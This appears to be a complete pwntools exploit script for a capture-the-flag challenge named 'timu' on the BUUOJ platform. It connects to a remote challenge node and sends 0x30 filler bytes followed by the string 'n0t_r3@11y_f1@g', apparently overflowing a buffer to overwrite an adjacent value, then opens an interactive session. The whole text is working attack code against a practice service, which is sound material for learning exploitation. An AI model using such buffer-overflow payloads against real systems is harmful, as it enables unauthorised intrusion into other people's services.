from pwn import *

#sh=process("./timu")
sh=remote("node5.buuoj.cn",27590)

payload=0x30*b'a'+b"n0t_r3@11y_f1@g"
sh.sendline(payload)
sh.interactive()
